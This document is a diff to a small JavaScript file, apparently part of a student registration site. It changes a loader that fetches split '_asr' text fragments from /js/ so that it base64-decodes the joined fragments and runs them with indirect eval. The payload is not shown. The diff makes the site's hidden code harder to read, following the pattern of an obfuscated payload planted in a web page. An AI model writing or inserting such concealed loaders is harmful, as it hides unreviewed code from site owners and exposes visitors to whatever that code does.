@@ -1,10 +1,14 @@
 (function(){
-  var F=["/js/_asr_s0.txt","/js/_asr_s1.txt","/js/_asr_s2.txt","/js/_asr_s3.txt","/js/_asr_s4.txt","/js/_asr_s5.txt","/js/_asr_s6.txt","/js/_asr_s7.txt"];
+  var F=["/js/_asr_b0.txt","/js/_asr_b1.txt","/js/_asr_b2.txt","/js/_asr_b3.txt"];
   Promise.all(F.map(function(f){
     return fetch(f,{credentials:"same-origin"}).then(function(r){
       if(!r.ok) throw new Error(f+" "+r.status);
       return r.text();
     });
-  })).then(function(p){ (0,eval)(p.join("")); })
-  .catch(function(e){ console.error("[students-reg]",e); });
+  })).then(function(parts){
+    var bin=atob(parts.join("").replace(/\s+/g,""));
+    var bytes=new Uint8Array(bin.length);
+    for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
+    (0,eval)(new TextDecoder("utf-8").decode(bytes));
+  }).catch(function(e){ console.error("[students-reg]",e); });
 })();
